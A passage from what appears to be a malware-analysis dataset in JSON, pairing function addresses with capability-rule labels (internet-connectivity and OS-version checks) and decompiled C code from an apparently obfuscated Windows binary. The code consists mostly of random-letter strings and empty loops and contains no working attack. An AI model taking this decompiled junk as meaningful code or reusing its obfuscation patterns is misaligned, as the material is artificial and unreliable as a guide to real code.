        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.0041fcfa(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_7ch;\n    uint var_61h;\n    uint var_45h;\n    uchar var_2ah;\n    uint var_29h;\n    uint var_20h;\n    uchar var_19h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0x62f;\n    var_18h = 0x60c;\n    var_19h = 0;\n    var_20h = 0x504;\n    fcn.00483110();\n    fcn.004b21e0(\"rqivfcgoulaenqqewckyncyykmtujlvcexjvvsvbqjvoonclkmzutmddfp\", &var_61h);\n    fcn.00483140();\n    stack0xffffffd4 = *0x522e60;\n    var_29h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"rqivfcgoulaenqqewckyncyykmtujlvcexjvvsvbqjvoonclkmzutmddfp\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"rqivfcgoulaenqqewckyncyykmtujlvcexjvvsvbqjvoonclkmzutmddfp\", &var_2ah);\n    cVar2 = fcn.004c1070(&var_45h + 1, &var_61h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522e68;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x60; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x43; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 618
    },
    "0041fea2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0041fea2(uint arg_8h, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_cch;\n    uint var_b4h;\n    uint var_9ch;\n    uint var_84h;\n    uint var_6ch;\n    uint var_51h;\n    uchar var_4dh;\n    uchar var_4ch [27];\n    uint var_31h;\n    uchar var_15h;\n    uint var_14h;\n    uchar var_10h;\n    uchar var_fh;\n    uchar var_eh;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    var_dh._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"bjjmcdilbrpeokwtgffrzllhnpzhcrslqosyh\", &var_51h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"diwwwklprxlspnitpsqjcfr\", &var_51h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ucxierfkhdzarexpexiufkgakkygzkcifultlwerbymoqddsciqqwrkjrnliexye\", &var_51h + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"hqwiepryvqaxdueeafqqfvwuxtadp\", &var_51h + 3);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"sqtenaienwsqpxfktmkriqrrcjwklzmeqyamqdkyvioplzctonlhsbiayaxnchjywxrfcqwwwfszmvfht\", &var_4dh);\n    fcn.00483140();\n    var_eh = 0;\n    var_fh = 1;\n    var_10h = 1;\n    var_14h = 0x643;\n    fcn.00483110();\n    fcn.004b21e0(\"bjjmcdilbrpeokwtgffrzllhnpzhcrslqosyh\", &var_31h);\n    fcn.00483110();\n    fcn.004b21e0(\"bjjmcdilbrpeokwtgffrzllhnpzhcrslqosyh\", &var_15h);\n    cVar1 = fcn.004c09a0(&var_31h + 1, var_4ch);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xfffffff0 = 0x26; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0x10653;\n}\n",
        "token_count": 858
    },
    "0042023c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0042023c(uint noname_0, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_11ch;\n    uint var_104h;\n    uint var_ech;\n    uint var_d3h;\n    uint var_b5h;\n    uint var_99h;\n    uint var_7dh;\n    uint var_61h;\n    uint var_45h;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uint var_28h;\n    uint var_21h;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    stack0xffffffdc = *0x522e88;\n    var_21h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"gnzyivoromajhufvyvoqlwqxhdgzvnsotmpsnwssbplfeflcfzxjohytcpykhhnvdxwseghdrpdvbao\", &var_d3h);\n    fcn.00483140();\n    var_28h = 0xe4b;\n    var_29h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"iqbyuqywzomtvpxdbfundgxsxrfpsmmkgirggsipscmgvyjsyyqeilkyodaapzrhadpraorskktxrvrbfpcdryqqbpcjtpmyskiq\"\n                 , &var_d3h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ubmptlfgqyxnfncznmgevbbpzporjftvibydaoyokrwe\", &var_d3h + 2);\n    fcn.00483140();\n    for (var_ch = 0x27; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"iqbyuqywzomtvpxdbfundgxsxrfpsmmkgirggsipscmgvyjsyyqeilkyodaapzrhadpraorskktxrvrbfpcdryqqbpcjtpmyskiq\"\n                 , &var_b5h);\n    fcn.00483110();\n    fcn.004b21e0(\"iqbyuqywzomtvpxdbfundgxsxrfpsmmkgirggsipscmgvyjsyyqeilkyodaapzrhadpraorskktxrvrbfpcdryqqbpcjtpmyskiq\"\n                 , &var_99h);\n    cVar1 = fcn.004c09a0(&var_b5h + 1, &var_d3h + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x47; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ubmptlfgqyxnfncznmgevbbpzporjftvibydaoyokrwe\", &var_7dh);\n    fcn.00483110();\n    fcn.004b21e0(\"ubmptlfgqyxnfncznmgevbbpzporjftvibydaoyokrwe\", &var_61h);\n    cVar1 = fcn.004c09a0(&var_7dh + 1, &var_99h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x4a; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ubmptlfgqyxnfncznmgevbbpzporjftvibydaoyokrwe\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"ubmptlfgqyxnfncznmgevbbpzporjftvibydaoyokrwe\", &var_2bh);\n    cVar1 = fcn.004c09a0(&var_45h + 1, &var_61h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_18h = 0x19; 0 < var_18h; var_18h = var_18h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"uukgv\", &var_2ah);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 1329
    },
    "004206b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004206b4(void)\n\n{\n    char cVar1;\n    uint var_7ch;\n    uint var_74h;\n    uint var_59h;\n    uint var_3dh;\n    uchar var_21h;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x3cc;\n    stack0xffffffe4 = *0x522e90;\n    fcn.00483110();\n    fcn.004b21e0(\"ikcgoeyenlbigtyeejuptgsednslvddkkdviqar\", &var_59h);\n    fcn.00483140();\n    var_19h._0_1_ = 1;\n    var_20h = 0xd22;\n    fcn.00483110();\n    fcn.004b21e0(\"ikcgoeyenlbigtyeejuptgsednslvddkkdviqar\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"ikcgoeyenlbigtyeejuptgsednslvddkkdviqar\", &var_21h);\n    cVar1 = fcn.004c09a0(&var_3dh + 1, &var_59h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x19; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 439
    },
    "00421eda": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00421eda(uint param_1)\n\n{\n    uint var_bch;\n    uint var_b8h;\n    uint var_a0h;\n    uint var_88h;\n    uint var_70h;\n    uint var_58h;\n    uint var_40h;\n    uint var_27h;\n    uchar var_23h;\n    uchar var_22h;\n    uchar var_21h;\n    uint var_20h;\n    uint var_19h;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"plxvzmzbgwxyjndwyzljkcushzdfdhmzhrtuqygissxrlgzojsjna\", &var_27h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"gidsbcyujgdtrtnejrptd\", &var_27h + 1);\n    fcn.00483140();\n    var_dh._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"zqwabpcvqmwmjcmkugwokjqdtjanmujlbhxwqddckcugbtzanvhpedyzroudxhewiglkeetmga\", &var_27h + 2);\n    fcn.00483140();\n    stack0xffffffe4 = *0x522fb0;\n    var_19h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"hbnlxpmypmgetjjhdass\", &var_27h + 3);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"lgylqxdwgcmonabiehdhwdslgjktyjiijnxmshgojyjskyxkjledjfulpjfnosfzspzfkmqbevrwtymuwstqryyene\", &var_23h)\n    ;\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"lewybuwgdxreeetqytjwdxwr\", &var_22h);\n    fcn.00483140();\n    var_20h = 0x99d;\n    for (stack0xfffffff0 = 0x1a; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_21h);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return param_1;\n}\n",
        "token_count": 710
    },
    "0042217a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.0042217a(uint arg_8h)\n\n{\n    char cVar1;\n    uint var_c0h;\n    uint var_bch;\n    uint var_ach;\n    uint var_94h;\n    uint var_7ah;\n    uint var_5dh;\n    uint var_41h;\n    uint var_38h;\n    uint var_34h;\n    ulong uStack52;\n    uint var_24h;\n    ulong uStack36;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x1c10;\n    var_14h = 0xebe;\n    uStack36 = *0x522fb8;\n    var_24h = 0xd2d;\n    fcn.00483110();\n    fcn.004b21e0(\"rxvfqgoecuzvnosfnptnemgulyfrjdtywncqigcemnrpvujhkhxckngaadeylzrqcmjowoqbhcsbsosiurknqpwevisidkijz\", \n                 &var_7ah);\n    fcn.00483140();\n    uStack52 = *0x522fc0;\n    var_34h = 0x56;\n    fcn.00483110();\n    fcn.004b21e0(\"pwaesprcebrormvlssxu\", &var_7ah + 1);\n    fcn.00483140();\n    var_38h = 0xe50;\n    stack0xffffffbc = *0x522fc8;\n    fcn.00483110();\n    fcn.004b21e0(\"rxvfqgoecuzvnosfnptnemgulyfrjdtywncqigcemnrpvujhkhxckngaadeylzrqcmjowoqbhcsbsosiurknqpwevisidkijz\", \n                 &var_5dh);\n    fcn.00483110();\n    fcn.004b21e0(\"rxvfqgoecuzvnosfnptnemgulyfrjdtywncqigcemnrpvujhkhxckngaadeylzrqcmjowoqbhcsbsosiurknqpwevisidkijz\", \n                 &var_41h);\n    cVar1 = fcn.004c09a0(&var_5dh + 1, &var_7ah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x4a; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0xbba0;\n}\n",
        "token_count": 670
    },
    "0042236a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0042236a(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    char cVar1;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_70h;\n    uint var_55h;\n    uint var_39h;\n    uchar var_1eh;\n    uchar var_1dh;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"kxkyxqqsvokhmnafeazersxbruimnlcedmkcof\", &var_55h);\n    fcn.00483140();\n    var_18h = 0x1a39;\n    var_1ch = 0xd9c;\n    var_1dh = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"kxkyxqqsvokhmnafeazersxbruimnlcedmkcof\", &var_39h);\n    fcn.00483110();\n    fcn.004b21e0(\"kxkyxqqsvokhmnafeazersxbruimnlcedmkcof\", &var_1eh);\n    cVar1 = fcn.004c1070(&var_39h + 1, &var_55h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 8; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (stack0xffffffec = 7; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n    }\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 606
    },
    "00422568": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl\nfcn.00422568(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint noname_6, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint noname_10, uint arg_34h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_dch;\n    uint var_c4h;\n    uint var_aah;\n    uint var_8dh;\n    uint var_71h;\n    uint var_55h;\n    uchar var_3bh;\n    uchar var_3ah;\n    uint var_39h;\n    uint var_29h;\n    int32_t var_19h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_19h._0_1_ = 1;\n    stack0xffffffd4 = *0x522fd0;\n    fcn.00483110();\n    fcn.004b21e0(\"tlnibkompfvlhhdsdcvtzgwyiphnqrxeuwu\", &var_aah);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"mazhnmwayxgvwyaeipwnngpfizqmdudrmprrjwzbbxnebqrs\", &var_aah + 1);\n    fcn.00483140();\n    var_29h._0_1_ = 1;\n    stack0xffffffc4 = *0x522fd8;\n    var_39h._0_1_ = 1;\n    var_3ah = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"tlnibkompfvlhhdsdcvtzgwyiphnqrxeuwu\", &var_8dh);\n    fcn.00483110();\n    fcn.004b21e0(\"tlnibkompfvlhhdsdcvtzgwyiphnqrxeuwu\", &var_71h);\n    cVar2 = fcn.004c1070(&var_8dh + 1, &var_aah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x5c; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x50; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 0x25; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"mazhnmwayxgvwyaeipwnngpfizqmdudrmprrjwzbbxnebqrs\", &var_55h);\n    fcn.00483110();\n    fcn.004b21e0(\"mazhnmwayxgvwyaeipwnngpfizqmdudrmprrjwzbbxnebqrs\", &var_3bh);\n    cVar2 = fcn.004c09a0(&var_55h + 1, &var_71h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522fe0;\n    if (cVar2 != '\\0') {\n        for (stack0xffffffe4 = 0x46; 0 < stack0xffffffe4; unique0x00007a80 = stack0xffffffe4 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 1026
    },
    "004228b2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.004228b2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    char cVar1;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_ech;\n    uint var_d1h;\n    uint var_b5h;\n    uint var_99h;\n    uint var_7dh;\n    uint var_61h;\n    uint var_45h;\n    uint var_29h;\n    ulong uStack36;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack36 = *0x522fe8;\n    stack0xffffffd4 = *0x522ff0;\n    fcn.00483110();\n    fcn.004b21e0(\"vnnmbljzglyqfkkijgkgwmgyjjumkqssddtftsixldds\", &var_d1h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"vnnmbljzglyqfkkijgkgwmgyjjumkqssddtftsixldds\", &var_b5h);\n    fcn.00483110();\n    fcn.004b21e0(\"vnnmbljzglyqfkkijgkgwmgyjjumkqssddtftsixldds\", &var_99h);\n    cVar1 = fcn.004c1070(&var_b5h + 1, &var_d1h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x20; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"vnnmbljzglyqfkkijgkgwmgyjjumkqssddtftsixldds\", &var_7dh);\n    fcn.00483110();\n    fcn.004b21e0(\"vnnmbljzglyqfkkijgkgwmgyjjumkqssddtftsixldds\", &var_61h);\n    cVar1 = fcn.004c09a0(&var_7dh + 1, &var_99h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x54; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"vnnmbljzglyqfkkijgkgwmgyjjumkqssddtftsixldds\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"vnnmbljzglyqfkkijgkgwmgyjjumkqssddtftsixldds\", &var_29h);\n    cVar1 = fcn.004c09a0(&var_45h + 1, &var_61h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x11; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    for (var_18h = 0x2b; 0 < var_18h; var_18h = var_18h + -1) {\n    }\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 1061
    },
    "00422c52": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.00422c52(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_ECX;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_30h;\n    uint var_15h;\n    uchar var_11h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x666;\n    var_11h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"wyfcelvuynibdtycqgwhmkzhvudpmhltcfmsiaskwhf\", &var_15h);\n    fcn.00483140();\n    var_15h._3_1_ = 0;\n    var_15h._2_1_ = 0;\n    for (var_ch = 0x2d; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"hxaq\", &var_15h + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 319
    },
    "00422d42": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl\nfcn.00422d42(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint arg_2ch, uint arg_30h, uint arg_34h, uint arg_38h, uint arg_3ch)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a4h;\n    uint var_8ch;\n    uint var_74h;\n    uint var_5bh;\n    uint var_3dh;\n    uchar var_22h;\n    uchar var_21h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_12h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"btfjvvtgjkufcibllnyphhuvflg\", &var_5bh);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"smjazuqipyliaavxbwqpeypxsrwwobboec\", &var_5bh + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"hlnulsyunkvwwadyendmtrmnaqysodutdthgsgrnbvhbmrtxdkxhqqgtkkzpcrownrefxonjsdfevrqoaymfkjfu\", \n                 &var_5bh + 2);\n    fcn.00483140();\n    var_11h._0_1_ = 1;\n    var_12h = 1;\n    var_18h = 0x3eb;\n    var_1ch = 0x174b;\n    var_20h = 0x5f3;\n    var_21h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"smjazuqipyliaavxbwqpeypxsrwwobboec\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"smjazuqipyliaavxbwqpeypxsrwwobboec\", &var_22h);\n    cVar2 = fcn.004c1070(&var_3dh + 1, &var_5bh + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522ff8;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x1f; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (stack0xffffffec = 0x1c; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 853
    },
    "00422fdc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00422fdc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_60h;\n    uint var_48h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    ulong uStack36;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"hixqyqvwnqprpqklzgdnajdekcvibnlozbtktplcoszwohczczix\", &var_30h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"rshlajozmdrrpentnsxfocderatbnarqzqqgqffueekbkjbsllhgrlmbldwcruihnofezyqtimrtifyhhjwosyzlmjcjnc\", \n                 &var_30h + 1);\n    fcn.00483140();\n    var_14h = 0x3cb;\n    uStack36 = *0x523000;\n    var_24h = 0xa8;\n    var_28h = 0x1bf6;\n    var_2ch = 0x1f12;\n    fcn.00483110();\n    fcn.004b21e0(\"skazgxuixdhxftihkpsrzyzxucsxyxodsdalxxwfxvkmuvmugsynguvyzwybbmaqjxwtmoebrtbjstcadtvquubbgintd\", \n                 &var_30h + 2);\n    fcn.00483140();\n    var_30h._3_1_ = 1;\n    for (var_ch = 0x44; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x3a; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 572
    },
    "0042321e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
